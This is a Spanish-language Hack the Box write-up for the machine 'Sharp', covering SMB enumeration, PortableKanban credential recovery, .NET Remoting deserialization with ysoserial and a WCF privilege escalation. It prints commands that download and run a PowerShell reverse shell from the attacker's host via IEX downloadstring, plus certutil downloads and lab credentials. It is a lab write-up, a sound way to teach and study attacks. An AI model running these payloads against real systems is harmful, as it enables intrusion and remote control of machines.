---
description: >-
  G4l1l30 write-up on the hard-difficulty Linux machine Sharp from
  https://hackthebox.eu
title: Hack the Box - Sharp Writeup
date: 2021-05-1 15:40:00 -0600
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, redteam, windows,ysoserial, hard, writeup, kanban, dnsspy, remoting_service, smb, wcf, smbget, smbmap, smbmapexec]     # TAG names should always be lowercase
show_image_post: true
image: /assets/img/Linux/Sharp/01-Sharp-infocard.png
---

## HTB - Sharp

## Overview

![](/assets/img/Linux/Sharp/01-Sharp-infocard.png)

Esta es una VM Hard de HackTheBox retirada en la 1ra semana de Mayo 2021.

## Escaneo del target

### Nmap scan

Apuntamos la IP de la VM 10.10.10.219 hacia sharp.htb en nuestro /etc/hosts

Empiezo mi scan con Nmap  

| `Flag` | Uso |
| :--- | :--- |
| `-p-` | Para escanear todos los puertos.  |
| `-vvv` | Proporciona una salida muy detallada para ver los resultados a medida que se encuentran. |
| `-sC` | Es equivalente a `--script=default` y ejecuta una serie de scripts de enum contra el target |
| `-sV` | Proporciona info de los servicios |
 
 A escanear :)
 
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 21:10 BST
Nmap scan report for sharp.htb (10.10.10.219)
Host is up (0.35s latency).
Not shown: 65529 filtered ports
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp open  storagecraft-image StorageCraft Image Manager
8889/tcp open  mc-nmf             .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -56m07s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-01T19:24:05
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 603.90 seconds
```
Acostumbro a empezar por los puertos que me resultan mas familiar :^)

#### SMB Enum.

Empezamos por SMB utilizando `smbmap -H sharp.htb` y obtenemos lo siguiente: 

![](/assets/img/Linux/Sharp/smb_01.png)

Tenemos permiso de lectura en el directorio Kaban, podemos acceder al mismo utilizando el el parametro -R

`smbmap -H sharp.htb -R`

![](/assets/img/Linux/Sharp/smb_02.png)

Muchos ficheros ¿no?, vamos a obtenerlos todo con `smbget` de la siguiente forma : `smbget -R smb://sharp.htb/kanban`

![](/assets/img/Linux/Sharp/smb_03.png)

### Kanban

Utilizaremos `ack` para buscar strings que sean de nuestro interes (podemos hacer lo mismo con grep), el uso quedaria asi : `ack -i "password"`

![](/assets/img/Linux/Sharp/kanban_01.png)

Nice :), echemos un vistazo a `PortableKanban.pk3` mas detalladamente y encontraremos dos usuarios : Administrator y Lars.

```text
Administrator
ID: e8e29158d70d44b1a1ba4949d52790a0
Encrypted Password: "k+iUoOvQYG98PuhhRC7/rg=="

Lars
ID: 0628ae1de5234b81ae65c246dd2b4a21
Encrypted Password: "Ua3LyPFM175GN8D3+tqwLA=="
```
Despues de estar estancado un rato, el manual del usuario "User Guide.pdf" es nuestro fichero ideal :)

Recien empezar a leer en la pagina 3 encontramos lo siguiente: 

![](/assets/img/Linux/Sharp/kanban_01.png)

Es decir, no es recomendable usar un blank password pero es posible.


En la pagina 18 podemos destacar dos cosas importantes: 1. El password del administrador(por defecto) es en blanco y si olvidamos el password, solo movemos el programa (que por cierto, es portable :) ) a otro directorio.

![](/assets/img/Linux/Sharp/kaban_02.png)

Interesante, indagando en el documento en la pagina 20, nos damos cuenta que los password se ocultan por defecto en `Setup/Users tab`.

![](/assets/img/Linux/Sharp/kaban_03.png)

Necesitamos una VM con Windows, pasamos los archivos de Kanban ya descargados.

#### Analizando el portable de Kanban en nuestro VM Windows.

Una vez descargado y descomprimido los archivos en nuestro VM Windows, ejecutaremos `PortableKanban.exe` e intentaremos loguearnos como Administrator y con el password vacio, el cual nos da un error. 

![](/assets/img/Linux/Sharp/kanban_02.png)

##### Obteniendo las credenciales 

Hay dos posibles formas de obtener las credenciales : 1. Forzando un password reset; 2. Utilizando un script en Python de ExploitDB.

###### Password Reset - Metodo 1

Echemos un vistazo a el archivo de conf: `PortableKanban.pk3` (donde encontramos las credenciales alojadas), borramos el contenido o valor del password de Admistrator e intentamos loguearnos con el mismo con el password vacio(blank password), nos saldra un aviso de que se usara el backup de pk3 :).

![](/assets/img/Linux/Sharp/Kanban_03.png)

Bingo, ya estamos logueado el programa.

![](/assets/img/Linux/Sharp/Kanban_04.png)

Encontaremos las credenciales de esta forma:

![](/assets/img/Linux/Sharp/Kanban_05.png)

###### ExploitDB 49409 - Metodo 2

Descargamos este exploit y simplemente lo ejecutamos

> * [https://www.exploit-db.com/exploits/49409](https://www.exploit-db.com/exploits/49409)

Obtenemos lo siguiente: 

![](/assets/img/Linux/Sharp/Kanban_06.png)

Este exploit nos acorta el tiempo para encontrar el password de administrator

```text
Administrator:G2@$btRSHJYTarg
lars:G123HHrth234gRG
```
##### Lars como Administrator - Continuacion del metodo 1

Tenemos la siguiente credenciales si solo hacemos el password reset

```text
Administrator:
lars:G123HHrth234gRG
```
Para volver a Lars como administrator, editamos el archivo pk3 y el pk3.bak, cambios el rol a admin e intentamos loguearnos con las credenciales que acabamos de encontrar

![](/assets/img/Linux/Sharp/Kanban_07.png)

### Enum II

Con las credenciales que obtuvimos, vamos a determinar cuales son validas para usar en SMB, en este caso usaremos `crackmapexe`.

La herramienta la podemos encontrar en la repo de su desarrollador :

> * [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

Si usamos Kali Linux, usamos la herramienta de la siguiente forma: `sudo crackmapexec smb 10.10.10.219 -u usernames.txt -p passwords.txt`

En este caso, estoy utilizando Parrot OS, asi que utilizo Poetry directamente del repo de Crackmapexec que lo tengo local.

![](/assets/img/Linux/Sharp/smb_04.png)

Tenemos la siguiente credencial valida:

```text
Sharp\lars:G123HHrth234gRG
```

Verificamos con smbmap : `smbmap -u lars -p G123HHrth234gRG -H sharp.htb`

Tenemos permiso de lectura en `dev`

![](/assets/img/Linux/Sharp/smb_05.png)

Utilizamos el parametro `-R` 

![](/assets/img/Linux/Sharp/smb_06.png)

A simple vista nada "interesante", asi que vamos a descargarnos todo el contenido y dejarlo en nuestro VM Windows con `smbget` (tambien podemos conectarnos via OpenVPN a la VM Sharp y descargarnos el contenido directamente).

`smbget -R smb://sharp.htb/dev/ -U lars%G123HHrth234gRG`

Obtenemos los siguientes archivos: 

![](/assets/img/Linux/Sharp/smb_07.png)

### Analizando Client.exe

Analizaremos Client.exe con dnSpy, lo podemos encontrar en el repositorio del desarrollador: 

> * [https://github.com/dnSpy/dnSpy](https://github.com/dnSpy/dnSpy)

Abrimos Client.exe con dnsSpy y encontramos unas credenciales en `remote sample`, a su vez podemos ver que hay un servicio en el puerto `8888` (tal cual vimos en nuestro scan con Nmap) y el path donde se hace el request : `SecretSharpDebugApplicationEndpoint`

Credenciales: 

```text
Username:debug
Password:SharpApplicationDebugUserPassword123!
```
En el mismo tab podemos observar que Client.exe hace uso de `Remoting.Channel.Tcp`, una busquedad rapida en Google y obtenemos info en Github

> * [https://github.com/tyranid/ExploitRemotingService](https://github.com/tyranid/ExploitRemotingService)

Bastante interesante, vemos que se basa en los siguientes CVE: CVE-2014-1806 o CVE-2014-4149, una busqueda rapida en Vulmon:

> * [https://vulmon.com/vulnerabilitydetails?qid=CVE-2014-1806](https://vulmon.com/vulnerabilitydetails?qid=CVE-2014-1806)

Y encontraremos dos repositorios ya con el exploit compilado.

> * [https://github.com/theralfbrown/ExploitRemotingService-binaries](https://github.com/theralfbrown/ExploitRemotingService-binaries)
> * [https://github.com/parteeksingh005/ExploitRemotingService_Compiled](https://github.com/parteeksingh005/ExploitRemotingService_Compiled)

### RevShell

Para crear nuestro reverse shell, necesitamos tener el siguiente escenario listo:

```text
1. Un servidor web (con Python resolvemos : python3 -m http.server 8080)
2. Netcat, en este caso estare utilizando nc64.exe : nc64.exe -nlvp 4444
3. El reverse shell a utilizar sera el de Nishang, editando el archivo y agregar al final : Invoke-PowerShellTcp -Reverse -IPAddress [Nuestra IP] -Port [Nuestro puerto en escucha]
4. Dado que la el parametro 'raw' nos permite usar "Send a raw serialized object to the service" :), usaremos Ysoserial de la siguiente manera : ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://nuestraIP/Invoke-PowerShellTcp.ps1')"
5. Nuestro request  seria de esta forma: ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123! raw" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw [nuestro payload generado en Ysoserial]
```
Podemos encontrar la ultima version de Ysoserial aqui:


> * [https://github.com/pwntester/ysoserial.net/releases](https://github.com/pwntester/ysoserial.net/releases)

El reverse shell de Nishang aqui:
> * [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Generamos nuestro payload con Ysoserial:

![](/assets/img/Linux/Sharp/ysoserial_01.png)

Ponemos a la escucha nuestro servidor web con Python:

![](/assets/img/Linux/Sharp/python_01.png)

Tenemos a netcat a la escucha y ejecutamos el exploit:

![](/assets/img/Linux/Sharp/shell.png)

Y tenemos el flag del User

![](/assets/img/Linux/Sharp/user.png)

### Lars 

En el path `C:\users\lars\Documents>` encontramos lo siguiente:

![](/assets/img/Linux/Sharp/wcf_01.png)

Documentandonos un poco desde:

> * [http://dotnetuy.com/blog/2018/02/14/tutorial-wcf-primera-parte-conceptos-basicos-de-wcf-windows-communication-foundation/](http://dotnetuy.com/blog/2018/02/14/tutorial-wcf-primera-parte-conceptos-basicos-de-wcf-windows-communication-foundation/)
> * [https://downloads.immunityinc.com/infiltrate2019-slidepacks/christopher-anastasio-abusing-insecure-wcf-endpoints-for-profit-and-fun/abusing_wcf_endpoints.pdf](https://downloads.immunityinc.com/infiltrate2019-slidepacks/christopher-anastasio-abusing-insecure-wcf-endpoints-for-profit-and-fun/abusing_wcf_endpoints.pdf)

Dentro de la carpeta `wcf` nos damos cuenta que es un proyecto en visual studio, procedemos a comprimir y guardarlo en la ruta compartida `dev`

![](/assets/img/Linux/Sharp/wcf_02.png)

Ya que estamos en la VM Windows, montamos el path compartido `net use X: \\10.10.10.219\dev` (usando las credenciales de Lars)

### Analizando WCF 

Abriendo el proyecto en Visual Studio, nos llama la atencion este path en espesifico:

![](/assets/img/Linux/Sharp/wcf_03.png)

Asi que basicamente descubrimos el client usa IWcfService para conectarse a los servicios de endpoint de WCF por el puerto `8889`, curiosamente hay unas variables predefinidas que nos son familiar. 

####  Abusando del proyecto WCF

Intentaremos inyectar codigo malicioso en el proyecto que encontramos y compilamos.

Codigo a agregar: 

Console.WriteLine(client.InvokePowerShell("IEX (new-object net.webclient).downloadstring('http://nuestraIP/Invoke-PowerShellTcp.ps1')"));

![](/assets/img/Linux/Sharp/wcf_04.png)

Procedemos a transferir los archivos, simplemente tomamos `WcfClient.exe` y `WcfRemotingLibrary.dll` que se encuentra en el path: `wcf\Client\bin\Debug`

![](/assets/img/Linux/Sharp/wcf_05.png)

Usando Certutil: `certutil -urlcache -split -f http://nuestraIP/archivo`

![](/assets/img/Linux/Sharp/wcf_06.png)

###PrivEsc - Root

Una vez transferimos los archivos, tengamos nuestro servidor web (en mi caso Python), nuestro Netcat en escucha, procedemos a ejecutar nuestro cliente recien transferido.

![](/assets/img/Linux/Sharp/wcf_07.png)

Ahora somos root/administrator :) 

![](/assets/img/Linux/Sharp/root.png)

Solo nos queda hacernos con la flag del root :D

![](/assets/img/Linux/Sharp/g4l1l30.png)

#EOF

